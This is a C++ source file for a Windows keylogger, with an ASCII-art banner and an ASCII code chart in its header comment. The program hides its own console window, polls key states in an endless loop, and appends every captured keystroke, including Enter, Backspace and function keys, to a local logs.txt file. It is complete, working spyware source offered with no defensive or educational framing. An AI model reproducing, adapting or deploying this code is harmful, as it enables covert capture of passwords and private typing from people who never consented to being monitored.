// Keylogger.cpp 
// by akshat sahijpal
//

/*
░█████╗░░░░░░░░░░░░░░░  ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
██╔══██╗░░██╗░░░░██╗░░  ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
██║░░╚═╝██████╗██████╗  █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██║░░██╗╚═██╔═╝╚═██╔═╝  ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
╚█████╔╝░░╚═╝░░░░╚═╝░░  ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
░╚════╝░░░░░░░░░░░░░░░  ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝





Decimal ASCII Chart
    16	DLE	32	SP	48	0	64	@	80	P	96	`	112	p
    17	DC1	33	!	49	1	65	A	81	Q	97	a	113	q
    18	DC2	34	"	50	2	66	B	82	R	98	b	114	r
    19	DC3	35	#	51	3	67	C	83	S	99	c	115	s
    20	DC4	36	$	52	4	68	D	84	T	100	d	116	t
    21	NAK	37	%	53	5	69	E	85	U	101	e	117	u
    22	SYN	38	&	54	6	70	F	86	V	102	f	118	v
    23	ETB	39	'	55	7	71	G	87	W	103	g	119	w
8	BS	24	CAN	40	(	56	8	72	H	88	X	104	h	120	x
9	HT	25	EM	41	)	57	9	73	I	89	Y	105	i	121	y
10	LF	26	SUB	42	*	58	:	74	J	90	Z	106	j	122	z
11	VT	27	ESC	43	+	59	;	75	K	91	[	107	k	123	{
12	FF	28	FS	44	,	60	<	76	L	92	\	108	l	124	|
13	CR	29	GS	45	-	61	=	77	M	93	]	109	m	125	}
14	SO	30	RS	46	.	62	>	78	N	94	^	110	n	126	~
15	SI	31	US	47	/	63	?	79	O	95	_	111	o	127	DEL


*/

#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <map>

const int SLEEP_INTERVAL = 10; 
const int MS_SHORT_DELAY = 2;

std::ofstream logFile;

std::string convertToKey(int i) {
    // Check for Alphanumeric keys directly via ASCII logic
    if (i >= 0x30 && i <= 0x39) return std::string(1, (char)i); // 0-9
    if (i >= 0x41 && i <= 0x5A) return std::string(1, (char)i); // A-Z

    switch (i) {
        case VK_SPACE:    return " [SPACE] ";
        case VK_RETURN:   return " [ENTER]\n";
        case VK_BACK:     return " [BACKSPACE] ";
        case VK_TAB:      return " [TAB] ";
        case VK_SHIFT:    return " [SHIFT] ";
        case VK_CONTROL:  return " [CTRL] ";
        case VK_MENU:     return " [ALT] ";
        case VK_CAPITAL:  return " [CAPS] ";
        case VK_ESCAPE:   return " [ESC] ";
        case VK_LEFT:     return " [LEFT] ";
        case VK_RIGHT:    return " [RIGHT] ";
        case VK_UP:       return " [UP] ";
        case VK_DOWN:     return " [DOWN] ";
        case VK_DELETE:   return " [DEL] ";
        case VK_SNAPSHOT: return " [PRT SC] ";
        // F-Keys
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            return " [F" + std::to_string(i - VK_F1 + 1) + "] ";
        default: return ""; 
    }
}

void LogPressedData(int i) {
    std::string key = convertToKey(i);
    if (!key.empty()) {
        std::cout << key;  
        logFile << key;
        logFile.flush(); 
    }
}

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    logFile.open("logs.txt", std::ios::app);
    if (!logFile.is_open()) return 1;

    while (true) {
        Sleep(SLEEP_INTERVAL); 
        
        // Iterate through standard virtual key codes (8 to 190 covers most)
        for (int i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                LogPressedData(i);
                
                while (GetAsyncKeyState(i) & 0x8000) { Sleep(MS_SHORT_DELAY); }
            }
        }
    }

    logFile.close();
    return 0;
}
